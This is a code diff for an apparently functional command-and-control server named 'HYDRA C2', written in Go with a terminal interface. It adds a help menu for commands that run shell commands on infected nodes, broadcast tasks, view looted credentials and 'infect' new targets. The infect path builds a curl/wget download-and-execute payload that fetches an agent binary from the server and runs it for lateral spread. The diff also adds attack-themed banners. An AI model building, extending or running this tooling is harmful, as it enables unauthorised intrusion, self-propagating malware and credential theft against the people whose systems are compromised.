@@ -4,6 +4,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"math/rand"
 	"net"
 	"os"
 	"sort"
@@ -42,7 +43,7 @@ var (
 	// Command History & Autocomplete
 	cmdHistory    []string
 	historyIdx    = -1
-	knownCommands = []string{"exec", "tasks", "loot", "clear", "exit", "broadcast", "infect"}
+	knownCommands = []string{"exec", "tasks", "loot", "clear", "exit", "broadcast", "infect", "help", "usage"}
 
 	// UI Components
 	app          *tview.Application
@@ -79,6 +80,47 @@ type Loot struct {
 	Category  string // NTLM, SSH, TOKEN, ENV
 	Data      string
 	Timestamp time.Time
+}
+
+// --- UI: BANNER REPOSITORY ---
+
+func getTacticalHeader() string {
+	banners := []string{
+		// Banner 1: Cold War / Analog Silo
+		`[red:black:b]
+  _   _   __  __   ____    ____       _      
+ | | | |  \ \/ /  |  _ \  |  _ \     / \     
+ | |_| |   \  /   | | | | | |_) |   / _ \    
+ |  _  |    | |   | |_| | |  _ <   / ___ \   
+ |_| |_|    |_|   |____/  |_| \_\ /_/   \_\  
+[white]────────────────────────────────────────────────────────────────────────
+[yellow]STATION: DECON_SILO_4 | [red]DEFCON: 3 [white]| [blue]PULSE_LINK: ESTABLISHED[white]
+[green]TIER-1: ONLINE | TIER-2: ONLINE | [red]THREAT_LEVEL: CRITICAL[white]`,
+
+		// Banner 2: Modern Cyber Warfare / APT
+		`[green:black:b]
+ ▄  █ ▄███▄   ▄▄▄▄▄      ▄▄▄▄▀ ▄█    ▄   
+█   █ █▀   ▀ █     ▀▄ ▀▀▀ █    ██     █  
+██▀▀█ ██▄▄ ▄  ▀▀▀▀▄       █    ██ ██   █ 
+█   █ █▄   ▄▀ ▀▄▄▄▄▀     █     ▐█ █ █  █ 
+   █  ▀███▀             ▀       ▐ █  █ █ 
+[white]────────────────────────────────────────────────────────────────────────
+[green]APT_MODE: ACTIVE | [blue]HEARTBEAT: 500ms [white]| [red]DEFENSE_BYPASS: ENABLED[white]
+[yellow]NODE: COVERT_B64 | LINK: ENCRYPTED | [green]STATUS: NOMINAL[white]`,
+
+		// Banner 3: Heavy Metal / Brutalist
+		`[blue:black:b]
+██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ 
+██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
+███████║ ╚████╔╝ ██║  ██║██████╔╝███████║
+██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║
+██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║
+[white]────────────────────────────────────────────────────────────────────────
+[blue]MODULE: INFECTION_ENGINE | [yellow]OBJECTIVE: NETWORK_SATURATION[white]
+[red]SCORCHED_EARTH: READY | [white]UPTIME: 144:12:02 | [blue]SIG_TYPE: ICMP/DNS[white]`,
+	}
+	rand.Seed(time.Now().UnixNano())
+	return banners[rand.Intn(len(banners))]
 }
 
 // --- NETWORK LOGIC & HEARTBEAT ---
@@ -202,7 +244,8 @@ func parseHydraDNS(w dns.ResponseWriter, r *dns.Msg) {
 }
 
 func StartIcmpListener() {
-	conn, _ := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
+	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
+	if err != nil { return }
 	for {
 		rb := make([]byte, 1500)
 		n, peer, _ := conn.ReadFrom(rb)
@@ -285,6 +328,23 @@ func refreshAgentTable() {
 	agentMutex.Unlock()
 }
 
+func printHelp() {
+	ts := time.Now().Format("15:04:05")
+	helpText := `
+[blue:black:b] HYDRA C2 TACTICAL MANUAL [-:-:-]
+[yellow]COMMAND      | DESCRIPTION                               | USAGE[-:]
+[white]exec         | Task a specific node with a shell command | exec <ID> <CMD>
+tasks        | View all currently queued/pending tasks   | tasks
+broadcast    | Task ALL active nodes simultaneously      | broadcast <CMD>
+infect       | Pivot: Task node to infect another target | infect <SourceID> <TargetIP>
+loot         | Access the vault of exfiltrated data      | loot
+clear        | Flush the transmission log display        | clear
+help/usage   | Display this tactical manual              | help
+exit         | Initiate Scorched Earth shutdown          | exit
+`
+	fmt.Fprintf(agentLog, "[%s] %s\n", ts, helpText)
+}
+
 func handleCommand(cmd string) {
 	ts := time.Now().Format("15:04:05")
 	fields := strings.Fields(cmd)
@@ -293,6 +353,8 @@ func handleCommand(cmd string) {
 	}
 
 	switch strings.ToLower(fields[0]) {
+	case "help", "usage":
+        printHelp()
 	case "exec":
 		if len(fields) < 3 {
 			fmt.Fprintf(agentLog, "[%s] [red]ERROR:[white] Usage: exec <ID> <CMD>\n", ts)
@@ -347,15 +409,14 @@ func handleCommand(cmd string) {
 		sourceID := fields[1]
 		targetIP := fields[2]
 		
-		// Payload: Download from C2, make executable, and run in background
-		payloadCmd := fmt.Sprintf("curl -sL http://10.5.0.5:8080/dist/hydra-agent -o /tmp/h-agent && chmod +x /tmp/h-agent && /tmp/h-agent &")
+		// LoTL Implementation: Tries curl first, fallbacks to wget
+		payloadCmd := fmt.Sprintf("(curl -sL http://10.5.0.5:8080/dist/hydra-agent -o /tmp/h-agent || wget -q http://10.5.0.5:8080/dist/hydra-agent -O /tmp/h-agent) && chmod +x /tmp/h-agent && /tmp/h-agent &")
 		
 		taskMutex.Lock()
 		agentTasks[sourceID] = fmt.Sprintf("PROPAGATE %s %s", targetIP, payloadCmd)
 		taskMutex.Unlock()
 		
-		fmt.Fprintf(agentLog, "[%s] [yellow]INFECTION_INITIATED[white] > Node %s tasked to infect %s\n", 
-			ts, sourceID, targetIP)
+		fmt.Fprintf(agentLog, "[%s] [yellow]INFECTION_INITIATED[white] > Node %s tasked to infect %s\n", ts, sourceID, targetIP)
 	case "clear":
 		agentLog.Clear()
 	case "exit":
@@ -387,13 +448,7 @@ func main() {
 	}
 
 	header := tview.NewTextView().SetDynamicColors(true).SetTextAlign(tview.AlignCenter).
-		SetText(`[blue:black:b]
-   █  █ █▀▀▄ █▀▀▄ █▀▀▄ ▄▀▀▄      █ █  ▄▀▀▄ █▀▀▄ █▀▄▀█      ▄▀▀▀  ▄▀▀▄ 
-   █▀▀█ █  █ █  █ █▄▄▀ █▄▄█ ▀▀   █ █  █  █ █▄▄▀ █ █ █      █     █▄▄█ 
-   █  █ █▄▄▀ █▄▄▀ █  █ █  █      ▀▄▀  ▀▄▄▀ █  █ █  █       ▀▄▄▄ █  █ 
-[white]────────────────────────────────────────────────────────────────────────
-[yellow]STATION: COVERT_NODE_B64 | [blue]PULSE_LINK: ESTABLISHED[white]
-[green]TIER-1: ONLINE | TIER-2: ONLINE | [red]THREAT_LEVEL: CRITICAL[white]`)
+		SetText(getTacticalHeader())
 
 	agentList = tview.NewTable().SetBorders(false)
 	agentList.SetTitle(" [blue]ACTIVE_SPECTRUM[white] ").SetBorder(true).SetBorderColor(tcell.GetColor("blue"))
@@ -462,7 +517,7 @@ func main() {
 	})
 
 	flex := tview.NewFlex().SetDirection(tview.FlexRow).
-		AddItem(header, 9, 1, false).
+		AddItem(header, 10, 1, false).
 		AddItem(tview.NewFlex().AddItem(agentList, 45, 1, false).AddItem(agentLog, 0, 2, false), 0, 4, false).
 		AddItem(statusFooter, 1, 1, false).
 		AddItem(cmdInput, 3, 1, true)
@@ -476,8 +531,6 @@ func main() {
 
 	gin.SetMode(gin.ReleaseMode)
 	r := gin.New()
-
-	// Serve the compiled agent binary for lateral propagation
 	r.StaticFile("/dist/hydra-agent", "./bin/hydra-agent")
 
 	r.POST("/api/v1/cloud-mock", func(c *gin.Context) {
@@ -498,6 +551,7 @@ func main() {
 			c.JSON(200, gin.H{"status": "verified", "task": task, "epoch": time.Now().Unix()})
 		}
 	})
+
 	r.POST("/api/v1/heartbeat", func(c *gin.Context) {
 		var t Telemetry
 		if err := c.ShouldBindJSON(&t); err == nil {
